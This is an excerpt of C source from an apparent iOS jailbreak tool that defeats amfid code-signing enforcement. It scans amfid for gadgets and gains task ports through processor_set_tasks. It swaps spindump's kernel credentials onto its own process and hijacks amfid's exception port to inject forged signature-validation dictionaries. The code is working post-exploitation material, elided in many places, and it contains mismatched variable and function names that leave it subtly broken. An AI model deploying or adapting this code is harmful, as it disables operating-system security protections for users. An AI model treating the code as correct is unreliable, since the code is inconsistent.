...
static inline bool check_if_amfid_has_entitParser(void) { return true; }

static void *getGadgetAddr(void *haystack, size_t haystackSize, void *gadget,
                           size_t gadgetSize) {
    /* TODO: iirc bmh is faster here */
    return memmem(haystack, haystackSize, gadget, gadgetSize);
}

static void *getAmfidMaddLdrGadget(void *haystack, size_t haystackSize) {
    ...
    return getGadgetAddr(haystack, haystackSize, needle, arraySize(needle));
}

static void *getAmfidSmaddlLdrGadget(void *haystack, size_t haystackSize) {
    unsigned char amfid_smaddl_ldr_gadget[] = {
...
static void *getAmfidEorMulGadget(void *haystack, size_t haystackSize) {
    unsigned char amfid_eor_mul_gadget[] = {
...
/* todo: i have no fucking idea what this gadget does? */
static kptr_t getAmfidX0Gadget(const void *const amfid_macho) {
    static const char const *segment = "__TEXT";
    static const char const *section = "__text";

    /* get mach section/segment info */
    const struct section_64 *amfid__text_info = NULL;
    const void *const amfid__text_data = NULL;
    unsigned long amfid__text_size = 0;

    amfid__text_info =
        getsectbynamefromheader_64(amfid_macho, segment, section);
    MANTICORE_THROW_ON_NULL(sect_info);
    amfid__text_data =
        getsectiondata(amfid_macho, segment, section, &sect_size);
    MANTICORE_THROW_ON_NULL(amfid__text_data);
    MANTICORE_THROW_IF_TRUE(amfid__text_size == 0);

    /* find the gadget */
    void *needle = NULL;

    manticoreInfo("Searching for amfid offset gadget needle #1");
    needle = getAmfidMaddLdrGadget(amfid__text_data, amfid__text_size);
    manticoreDebug("Gadget attempt 1 yielded %p", needle);

    if (needle == NULL) {
        manticoreInfo("Searching for amfid offset gadget needle #2");
        needle = getAmfidSmaddlLdrGadget(amfid__text_data, amfid__text_size);
        manticoreDebug("Gadget attempt 2 yielded %p", needle);

        if (needle == NULL) {
            manticoreInfo("Searching for amfid offset gadget needle #3");
            needle = getAmfidEorMulGadget(amfid__text_data, amfid__text_size);
            manticoreDebug("Gadget attempt 3 yielded %p", needle);
        }
    }

    MANTICORE_THROW_ON_NULL(needle);

    return (kptr_t)ptrAdd(ptrSub(find_gadget, sect_data), sect_info->offset);
}

static kptr_t getAmfidMISValidateAddress(const void *const amfid_macho) {
    /* todo: not refactoring this for now as we should move all mach-o related
     * stuff to it's own class/file */
    ...
    for (uint32_t i = 0; i < cmd_count; ++i) {
        ...
        case LC_SYMTAB: {
            ...
            for (int i = 0; i < nsyms; i++) {
                struct nlist_64 *nn = (nlist_64 *)((char *)mh + symoff +
                ...
                if (i != 0 && i != 1) { // Two at beginning are local symbols,
                                        // they don't count
    ...
    if (MISValidate_symIndex == 0) {
        printf("Error in find_amfid_OFFSET_MISValidate_symbol(): "
               "MISValidate_symIndex == 0\n");
        exit(1);
    }

    const struct section_64 *sect_info = NULL;
    if (g_exp.has_PAC) {
        const char *_segment = "__DATA_CONST", *_segment2 = "__DATA",
                   *_section = "__auth_got";
        // _segment for iOS 13, _segment2 for <= iOS 12
        sect_info = getsectbynamefromheader_64(
            (const struct mach_header_64 *)amfid_macho, _segment, _section);
        if (!sect_info)
            sect_info = getsectbynamefromheader_64(
                (const struct mach_header_64 *)amfid_macho, _segment2,
                _section);
    } else {
...
mach_port_t taskForPidWorkaround(int pid) {
    kern_return_t kr;

    /* get the current processor set */
    host_t this_host = mach_host_self();
    processor_set_name_t procSet;
    kr = processor_set_default(this_host, &procSet);
    if (kr != KERN_SUCCESS) {
        manticoreThrow(
            "Call to processor_set_default failed with errno %x (%s)", kr,
            mach_error_string(kr));
    }

    /* get the control port for this set */
    processor_set_t procSetControlPort;
    kr = host_processor_set_priv(this_host, procSet, &procSetControlPort);
    if (kr != KERN_SUCCESS) {
        manticoreThrow(
            "Call to host_processor_set_priv failed with errno %x (%s)", kr,
            mach_error_string(kr));
    }

    /* get a send right to the kernel port of each task in this set */
    task_array_t tasks;
    mach_msg_type_number_t numTasks;
    kr = processor_set_tasks(procSetControlPort, &tasks, &numTasks);
    if (kr != KERN_SUCCESS) {
        manticoreThrow("Call to processor_set_tasks failed with errno %x (%s)",
    ...
    /* todo: processor_set_tasks has heap artifacts */
    return ret;
}
...
/*!
    ...
    @abstract
        steal credentials of a child process to get rights for patching amfid
    ...
    if (spindump_proc_cred == 0) {
        ...
        printf("-> Swapping spindump credentials....\t%s\n",
               look_for_proc("/usr/sbin/spindump")
                   ? "(Spindump running already)"
                   : "(Spindump not running)");
        ...
        kptr_t spindump_proc_cred =
            kapi_read_kptr(spindump_proc + OFFSET(proc, p_ucred));
        ...
        if (patch_TF_PLATFORM(target_task)) {
            ...
            self_cached_creds =
                kapi_read_kptr(target_proc + OFFSET(proc, p_ucred));
            if (kapi_write64(target_proc + OFFSET(proc, p_ucred),
                             spindump_proc_cred))
                printf("-> Successfully swapped spindump credentials.\n");
        } else {
...
void safepatch_unswap_spindump_cred(uint64_t target_proc) {
    ...
    if (kapi_write64(target_proc + OFFSET(proc, p_ucred), self_cached_creds))
        printf("-> Successfully swapped spindump credentials.\n");
}
...
uint8_t *map_file_to_mem(const char *path) {
    ...
    uint8_t *mapping_mem = (uint8_t *)mmap(
        NULL, mach_vm_round_page(amfid_fsize), PROT_READ, MAP_SHARED, fd, 0);
...
/**
        binary_load_address(mach_port_t target_port) ---> returns kptr_t
object/addresss Function to find the binary load address of amfid in memory.
**/
...
kptr_t binary_load_address(mach_port_t target_port) {
    ...
    err = mach_vm_region(target_port, &target_first_addr, &target_first_size,
...
void *Build_ValidateSignature_dic(uint8_t *input_cdHash, size_t *out_size,
                                  uint64_t shadowp) {
    // Build a self-contained, remote-address-adapted CFDictionary instance

    CFDataRef _cfhash_cfdata =
        CFDataCreate(kCFAllocatorDefault, input_cdHash, TRUST_CDHASH_LEN);
    ...
    *out_size = total_len;
    ...
    char *realCFString = (char *)CFStringCreateWithCString(
        0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", kCFStringEncodingUTF8);
    const char *keys[] = {realCFString};
    const char *values[] = {realCFString};
    char *realCFDic = (char *)CFDictionaryCreate(
        0, (const void **)keys, (const void **)values, 1,
...
void *amfid_exception_handler(void *arg) {
    ...
    for (;;) {
        ...
        err = mach_msg(msg,
                       ...
                       0, size, amfid_exception_port, 0, 0);
        if (err != KERN_SUCCESS) {
            ...
            err = thread_get_state(thread_port, ARM_THREAD_STATE64,
                                   (thread_state_t)&old_state, &old_stateCnt);
            if (err != KERN_SUCCESS) {
            ...
            char *filename = (char *)rmem(task_port,
                                          check_if_amfid_has_entitParser()
                                              ? new_state.__x[24]
                                              : new_state.__x[23],
                                          1024);
            ...
            if (cdhash) {
                ...
                if (reserved_mem_in_amfid == 0) {
                    // Allocate a page of memory in amfid, where we stored cfdic
                    // for bypass signature valid
                    vm_allocate(task_port,
                                (vm_address_t *)&reserved_mem_in_amfid, 0x4000,
                                VM_FLAGS_ANYWHERE);
                    ...
                    size_t out_size = 0;
                    char *fakedic = (char *)Build_ValidateSignature_dic(
                        cdhash, &out_size,
                        reserved_mem_in_amfid + offset_to_store);
                    kapi_write(reserved_mem_in_amfid + offset_to_store, fakedic,
                               (uint32_t)out_size);
                    update_cdhash_in_amfid =
                        reserved_mem_in_amfid + offset_to_store +
                        0x70; // To update cdhash in the same cfdic
                    update_retainCnt_in_amfid = *(
                        uint64_t
                            *)(fakedic); // To keep dic away from being release
                    free(fakedic);
                } else {
                    if (cdhash) {
                        for (int i = 0; i < TRUST_CDHASH_LEN; i++) {
                            kapi_write((kptr_t)(update_cdhash_in_amfid + i),
                                       (void *)cdhash[i], (sizeof(cdhash[i])));
                        }
                        kapi_write64(reserved_mem_in_amfid + offset_to_store,
                                     update_retainCnt_in_amfid);
                    }
                }
                free(cdhash);
            ...
            new_state.__x[8] =
                reserved_mem_in_amfid; // For the next encouter instr: LDR  X0,
                                       // [X8,#0x28] <- Clear out X0 as success
                                       // return

            // set the new thread state:
            err = thread_set_state(thread_port, ARM_THREAD_STATE64,
            ...
            err = mach_msg(&reply.Head, MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
                           (mach_msg_size_t)sizeof(reply), 0, MACH_PORT_NULL,
...
void set_exception_handler(mach_port_t amfid_task_port) {
    ...
    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
                                  &amfid_exception_port)) != KERN_SUCCESS)
        printf("Allocating a new task port failed.\t(%d)\n", ret);
    if ((ret = mach_port_insert_right(mach_task_self(), amfid_exception_port,
                                      amfid_exception_port,
                                      MACH_MSG_TYPE_MAKE_SEND)) != KERN_SUCCESS)
        printf("Inserting rights to amfid_exception_port failed.\t(%d)\n", ret);
    ...
    kern_return_t err = task_set_exception_ports(
        amfid_task_port, EXC_MASK_ALL, amfid_exception_port,
        EXCEPTION_DEFAULT |
            MACH_EXCEPTION_CODES, // we want to receive a catch_exception_raise
                                  // message with the thread port for the
                                  // crashing thread
        6);
    ...
    if (err != KERN_SUCCESS) {
        ...
        pthread_create(&exception_thread, &pth_commAttr,
                       amfid_exception_handler, NULL);
    }
}

/***
 Replace the Original Amfid task port with a custom one, created by us.
 (https://github.com/bazad/blanket/blob/22d670d25b8ab5ad569c3f8f4de108ae8e0b6e0a/amfidupe/amfidupe.c#L93)
 */
...
bool replace_amfid_port() {
    ...
    if (kr != KERN_SUCCESS) {
        manticoreError("Could not get amfid's service port!\n");
        return false;
    }
    mach_port_options_t options = {.flags = MPO_INSERT_SEND_RIGHT};
    kr = mach_port_construct(mach_task_self(), &options, 0, &fake_amfid_port);
    if (kr != KERN_SUCCESS) {
        manticoreError("Could not create fake amfid port!\n");
        return false;
    }
    kr = host_set_amfid_port(host, fake_amfid_port);
    if (kr != KERN_SUCCESS) {
        manticoreError("Could not register fake amfid port: error %d\n", kr);
        return false;
    }
    manticoreInfo("Registered new amfid port: 0x%x\n", fake_amfid_port);
    return true;
}

bool performAmfidPatches() {
    manticoreInfo("Applying amfid patches");

    if (runningAsRoot()) {
        manticoreWarn("performAmfidPatches called running as root. Add a "
                      "breakpoint here to find second call");
        return false;
    }

    // map file into memory
    struct manticore_mapped_file amfid_file;
    manticoreDebug("Mapping amfid binary into memory") if (
        manticoreMmapFile("/usr/libexec/amfid", &amfid_file)) {
        manticoreError("Failed to mmap amfid binary into memory");
        return false;
    }

    // get offsets
    kptr_t offMISValidate = getAmfidMISValidateAddress(amfid_file->ptr);
    kptr_t offGadget = getAmfidOffsetGadget(amfid_file->ptr);
    manticoreDebug("Found amfid MISValidate: %p", offMISValidate);
    manticoreDebug("Found amfid Gadget:      %p", offGadget);

    manticoreDebug("Unmapping amfid binary");
    manticoreMunmapFile(amfid_file);
    ...
    mach_port_t remoteTask = taskForPidWorkaround(amfid_pid);
    ...
    manticoreDebug("amfid task: %p",
                   kproc_find_by_pid(amfid_pid) + OFFSET(proc, task));
    manticoreDebug("amfid port: %p", remoteTask);
    manticoreDebug("amfid base: %p", amfid_base);

    // todo: refactor the rest of this
    vm_protect(remoteTask,
               mach_vm_trunc_page(amfid_base + amfid_OFFSET_MISValidate_symbol),
               0x4000, false, VM_PROT_READ | VM_PROT_WRITE);
